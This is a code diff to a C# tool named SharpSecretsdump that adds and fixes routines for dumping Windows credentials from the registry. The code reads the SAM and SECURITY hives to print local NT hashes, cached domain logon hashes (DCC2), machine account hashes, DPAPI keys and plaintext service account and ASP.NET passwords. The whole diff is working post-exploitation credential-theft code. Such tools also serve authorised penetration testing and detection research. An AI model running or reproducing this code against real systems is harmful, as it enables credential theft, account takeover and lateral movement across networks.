@@ -103,6 +103,179 @@ namespace SharpSecretsdump
             return hashedBootKey;
         }
 
+        public static void GetLsaSecrets(byte[] bootKey)
+        {
+            try
+            {
+                byte[] decryptedLsaKey = LSADump.GetLSAKey(bootKey);
+
+                //get NLKM Secret
+                byte[] nlkmKey = LSADump.GetLSASecret("NL$KM", decryptedLsaKey);
+
+                IntPtr hKey = IntPtr.Zero;
+                IntPtr dummy = IntPtr.Zero;
+                String keyPath = "SECURITY\\Cache";
+                StringBuilder classVal = new StringBuilder(1024);
+                int len = 1024;
+                int result = Interop.RegOpenKeyEx(0x80000002, keyPath, 0, 0x19, ref hKey);
+                if (result != 0)
+                {
+                    int error = Marshal.GetLastWin32Error();
+                    string errorMessage = new Win32Exception((int)error).Message;
+                    Console.WriteLine("Error enumerating {0} ({1}) : {2}", keyPath, error, errorMessage);
+                    Environment.Exit(0);
+                }
+                IntPtr number = IntPtr.Zero;
+                result = Interop.RegQueryInfoKey(hKey, classVal, ref len, 0, ref dummy, ref dummy, ref dummy,
+                        ref number, ref dummy, ref dummy, ref dummy, IntPtr.Zero);
+                if (result != 0)
+                {
+                    int error = Marshal.GetLastWin32Error();
+                    string errorMessage = new Win32Exception((int)error).Message;
+                    Console.WriteLine("Error enumerating {0} ({1}) : {2}", keyPath, error, errorMessage);
+                    Environment.Exit(0);
+                }
+
+                if (nlkmKey != null && nlkmKey.Length > 0)
+                {
+                    Console.WriteLine("[*] Dumping cached domain logon information (domain/username:hash)");
+                    byte[] data;
+                    string valueName;
+                    for (int i = 0; i < number.ToInt32(); i++)
+                    {
+                        len = 255;
+                        classVal = new StringBuilder(len);
+                        dummy = IntPtr.Zero;
+                        result = Interop.RegEnumValue(hKey, i, classVal, ref len, 0, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
+                        if (result != 0)
+                        {
+                            int error = Marshal.GetLastWin32Error();
+                            string errorMessage = new Win32Exception((int)error).Message;
+                            Console.WriteLine("Error enumerating {0} ({1}) : {2}", keyPath, error, errorMessage);
+                            Environment.Exit(0);
+                        }
+
+                        valueName = classVal.ToString();
+                        data = GetRegKeyValue(keyPath, valueName);
+
+                        if (string.Compare(valueName, "NL$Control", StringComparison.OrdinalIgnoreCase) != 0
+                                && !IsZeroes(data.Take(16).ToArray()))
+                        {
+                            NL_Record cachedUser = new NL_Record(data);
+                            byte[] plaintext = Crypto.DecryptAES_CBC(cachedUser.encryptedData, nlkmKey.Skip(16).Take(16).ToArray(), cachedUser.IV);
+                            byte[] hashedPW = plaintext.Take(16).ToArray();
+                            string username = Encoding.Unicode.GetString(plaintext.Skip(72).Take(cachedUser.userLength).ToArray());
+                            string domain = Encoding.Unicode.GetString(plaintext.Skip(72 + Pad(cachedUser.userLength)
+                                + Pad(cachedUser.domainNameLength)).Take(Pad(cachedUser.dnsDomainLength)).ToArray());
+                            domain = domain.Replace("\0", "");
+                            Console.WriteLine(string.Format("{0}/{1}:$DCC2$10240#{2}#{3}", domain,
+                                    username, username, BitConverter.ToString(hashedPW).Replace("-", "").ToLower()));
+                        }
+                    }
+                }
+
+                Interop.RegCloseKey(hKey);
+
+                try
+                {
+                    Console.WriteLine("[*] Dumping LSA Secrets");
+                    keyPath = "SECURITY\\Policy\\Secrets";
+                    classVal = new StringBuilder(1024);
+                    len = 1024;
+                    result = Interop.RegOpenKeyEx(0x80000002, keyPath, 0, 0x19, ref hKey);
+                    if (result != 0)
+                    {
+                        int error = Marshal.GetLastWin32Error();
+                        string errorMessage = new Win32Exception((int)error).Message;
+                        Console.WriteLine("Error enumerating {0} ({1}) : {2}", keyPath, error, errorMessage);
+                        Environment.Exit(0);
+                    }
+                    number = IntPtr.Zero;
+                    result = Interop.RegQueryInfoKey(hKey, classVal, ref len, 0, ref number, ref dummy, ref dummy,
+                            ref dummy, ref dummy, ref dummy, ref dummy, IntPtr.Zero);
+                    if (result != 0)
+                    {
+                        int error = Marshal.GetLastWin32Error();
+                        string errorMessage = new Win32Exception((int)error).Message;
+                        Console.WriteLine("Error enumerating {0} ({1}) : {2}", keyPath, error, errorMessage);
+                        Environment.Exit(0);
+                    }
+
+                    for (int i = 0; i < number.ToInt32(); i++)
+                    {
+                        len = 255;
+                        result = Interop.RegEnumKeyEx(hKey, i, classVal, ref len, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref dummy);
+                        if (result != 0)
+                        {
+                            int error = Marshal.GetLastWin32Error();
+                            string errorMessage = new Win32Exception((int)error).Message;
+                            Console.WriteLine("Error enumerating {0} ({1}) : {2}", keyPath, error, errorMessage);
+                            Environment.Exit(0);
+                        }
+            
+                        string secret = classVal.ToString();
+                  
+                        if (string.Compare(secret, "NL$Control", StringComparison.OrdinalIgnoreCase) != 0)
+                        {
+                            if (string.Compare(secret, "NL$KM", StringComparison.OrdinalIgnoreCase) != 0)
+                            {
+                                LsaSecretBlob secretBlob = new LsaSecretBlob(LSADump.GetLSASecret(secret, decryptedLsaKey));
+                                if (secretBlob.length > 0)
+                                {
+                                    Console.WriteLine($"[*] {secret}");
+                                    if (secret.ToUpper().StartsWith("$MACHINE.ACC"))
+                                    {
+                                        string computerAcctHash = BitConverter.ToString(Crypto.Md4Hash2(secretBlob.secret)).Replace("-", "").ToLower();
+                                        string domainName = Encoding.ASCII.GetString(GetRegKeyValue("SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters", "Domain")).Trim('\0');
+                                        string computerName = Encoding.ASCII.GetString(GetRegKeyValue("SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters", "Hostname")).Trim('\0');
+                                        Console.WriteLine(string.Format("{0}\\{1}$:aad3b435b51404eeaad3b435b51404ee:{2}", domainName, computerName, computerAcctHash));
+                                    }
+                                    else if (secret.ToUpper().StartsWith("DPAPI"))
+                                    {
+                                        Console.WriteLine("dpapi_machinekey:0x" + BitConverter.ToString(secretBlob.secret.Skip(4).Take(20).ToArray()).Replace("-", "").ToLower());
+                                        Console.WriteLine("dpapi_userkey:0x" + BitConverter.ToString(secretBlob.secret.Skip(24).Take(20).ToArray()).Replace("-", "").ToLower());
+                                    }
+                                    else if (secret.ToUpper().StartsWith("_SC_"))
+                                    {
+                                        string startName = Encoding.ASCII.GetString(GetRegKeyValue($"SYSTEM\\ControlSet001\\Services\\{secret.Substring(4)}", "ObjectName")).Trim('\0');
+                                        string pw = Encoding.Unicode.GetString(secretBlob.secret.ToArray());
+                                        Console.WriteLine($"{startName}:{pw}");
+                                    }
+                                    else if (secret.ToUpper().StartsWith("ASPNET_WP_PASSWORD"))
+                                    {
+                                        Console.WriteLine("ASPNET:" + System.Text.Encoding.Unicode.GetString(secretBlob.secret));
+                                    }
+                                    else
+                                    {
+                                        Console.WriteLine("[!] Secret type not supported yet - outputing raw secret as unicode:");
+                                        Console.WriteLine(Encoding.Unicode.GetString(secretBlob.secret));
+                                    }
+                                }
+                            }
+                            else
+                            {
+                                LsaSecretBlob secretBlob = new LsaSecretBlob(nlkmKey);
+                                Console.WriteLine("[*] NL$KM");
+                                if (secretBlob.length > 0)
+                                {
+                                    Console.WriteLine("NL$KM:" + BitConverter.ToString(secretBlob.secret).Replace("-", "").ToLower());
+                                }
+                            }
+                        }
+                    }
+                }
+                catch
+                {
+                    Console.WriteLine("Boom");
+                }
+                Interop.RegCloseKey(hKey);
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine(e.ToString());
+            }
+        }
+
         public static void GetSamAccounts(byte[] bootkey)
         {
             Console.WriteLine("[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)");
@@ -117,8 +290,15 @@ namespace SharpSecretsdump
             StringBuilder classVal = new StringBuilder(1024);
             int len = 1024;
             int result = Interop.RegOpenKeyEx(0x80000002, keyPath, 0, 0x19, ref hKey);
+            if (result != 0)
+            {
+                int error = Marshal.GetLastWin32Error();
+                string errorMessage = new Win32Exception((int)error).Message;
+                Console.WriteLine("Error enumerating {0} ({1}) : {2}", keyPath, error, errorMessage);
+                Environment.Exit(0);
+            }
             IntPtr number = IntPtr.Zero;
-            result = Interop.RegQueryInfoKey(hKey, classVal, ref len, 0, ref dummy, ref number, ref dummy, ref dummy, ref dummy, ref dummy, ref dummy, IntPtr.Zero);
+            result = Interop.RegQueryInfoKey(hKey, classVal, ref len, 0, ref number, ref dummy, ref dummy, ref dummy, ref dummy, ref dummy, ref dummy, IntPtr.Zero);
             if (result != 0)
             {
                 int error = Marshal.GetLastWin32Error();
@@ -127,8 +307,7 @@ namespace SharpSecretsdump
                 Environment.Exit(0);
             }
 
-            // length - 2 because . and .. ?
-            for (int i = 0; i < number.ToInt32() - 2; i++)
+            for (int i = 0; i < number.ToInt32(); i++)
             {
                 len = 255;
                 result = Interop.RegEnumKeyEx(hKey, i, classVal, ref len, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref dummy);
@@ -136,14 +315,16 @@ namespace SharpSecretsdump
                 {
                     int error = Marshal.GetLastWin32Error();
                     string errorMessage = new Win32Exception((int)error).Message;
-                    Console.WriteLine("Error enumeratingwqdqw {0} ({1}) : {2}", keyPath, error, errorMessage);
+                    Console.WriteLine("Error enumerating {0} ({1}) : {2}", keyPath, error, errorMessage);
                     Environment.Exit(0);
                 }
 
-                if (classVal.ToString().StartsWith("000"))
+                if (classVal.ToString().StartsWith("0"))
                 {
                     byte[] rid = BitConverter.GetBytes(System.Int32.Parse(classVal.ToString(), System.Globalization.NumberStyles.HexNumber));
                     byte[] v = GetRegKeyValue($"{keyPath}\\{classVal}", "V");
+                    if (v == null || v.Length <= 0)
+                        continue;
                     int offset = BitConverter.ToInt32(v, 12) + 204;
                     int length = BitConverter.ToInt32(v, 16);
                     string username = Encoding.Unicode.GetString(v.Skip(offset).Take(length).ToArray());
@@ -155,6 +336,8 @@ namespace SharpSecretsdump
                     int ntHashLength = BitConverter.ToInt32(v, 172);
                     string lmHash = "aad3b435b51404eeaad3b435b51404ee";
                     string ntHash = "31d6cfe0d16ae931b73c59d7e0c089c0";
+                    if (ntHashLength <= 0)
+                        continue;
 
                     //old style hashes
                     if (v[ntHashOffset + 2].Equals(0x01))
@@ -202,23 +385,47 @@ namespace SharpSecretsdump
                             ntHash = Crypto.DecryptSingleHash(desEncryptedHash, classVal.ToString()).Replace("-", "");
                         }
                     }
-                    string ridStr = System.Int32.Parse(classVal.ToString(), System.Globalization.NumberStyles.HexNumber).ToString();
+                    string ridStr = int.Parse(classVal.ToString(), System.Globalization.NumberStyles.HexNumber).ToString();
                     string hashes = (lmHash + ":" + ntHash);
                     Console.WriteLine(string.Format("{0}:{1}:{2}", username, ridStr, hashes.ToLower()));
                 }
+            }
+            Interop.RegCloseKey(hKey);
+        }
+
+        private static bool IsZeroes(byte[] inputArray)
+        {
+            foreach (byte b in inputArray)
+            {
+                if (b != 0x00)
+                {
+                    return false;
+                }
+            }
+            return true;
+        }
+
+        private static int Pad(int data)
+        {
+            if ((data & 0x3) > 0)
+            {
+                return (data + (data & 0x3));
+            }
+            else
+            {
+                return data;
             }
         }
 
         public static byte[] GetRegKeyValue(string keyPath, string valueName = null)
         {
-            // takes a given HKLM key path and returns the registry value
-
-            int result = 0;
             IntPtr hKey = IntPtr.Zero;
+
+            // takes a given HKLM key path and returns the registry value
 
             // open the specified key with read (0x19) privileges
             //  0x80000002 == HKLM
-            result = Interop.RegOpenKeyEx(0x80000002, keyPath, 0, 0x19, ref hKey);
+            int result = Interop.RegOpenKeyEx(0x80000002, keyPath, 0, 0x19, ref hKey);
             if (result != 0)
             {
                 int error = Marshal.GetLastWin32Error();
